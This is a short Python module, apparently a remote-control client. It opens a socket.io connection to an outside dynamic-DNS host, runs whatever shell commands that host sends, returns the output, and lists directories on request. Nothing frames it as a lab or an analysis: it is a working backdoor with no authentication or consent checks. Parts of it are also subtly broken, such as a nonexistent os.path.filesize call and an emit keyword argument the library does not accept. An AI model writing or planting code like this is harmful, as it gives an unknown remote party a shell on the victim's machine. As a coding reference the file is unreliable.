# version 0.1.0

def run(device_id):
    
    from threading import Thread
    class bThread(Thread):
        def __init__(self, group=None, target=None, name=None,
                     args=(), kwargs={}, Verbose=None):
            Thread.__init__(self, group, target, name, args, kwargs)
            self._return = None
        def run(self):
            if self._target is not None:
                self._return = self._target(*self._args,
                                                    **self._kwargs)
        def join(self, *args):
            Thread.join(self, *args)
            return self._return
        
    def rc(device_id):
        try:
            import socketio
            import subprocess
            import os
            sio = socketio.Client(logger=False, engineio_logger=False)

            @sio.on('godown', namespace='/rc')
            def on_godown():
                sio.disconnect()
                return 'godown'

            @sio.on('command', namespace='/rc')
            def on_command_(command):
                print(command)
                process = subprocess.Popen(command,
                                           stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE)
                stdout, stderr = process.communicate()
                sio.emit('command_out', json={'command': command, 'stdout': stdout, 'stderr': stderr}, namespace='/rc')

            @sio.on('listdir', namespace='/rc')
            def on_listdir(path):
                dir = {}
                for f in os.listdir(path):
                    dir[f] = {'name': f,
                              'datatype': ('file' if os.path.isfile(path) else 'directory'),
                              'filesize': (0 if os.path.isdir(path) else os.path.filesize(path))}
                sio.emit('listdir_out', json=dir, namespace='/rc')

            sio.connect('http://internetz.ddns.net:8080', namespaces=['/rc'])
            sio.wait()
        except Exception as e:
            return e

    runT = bThread(target=rc, args=(device_id,))
    runT.start()
    return runT.join()

        

    
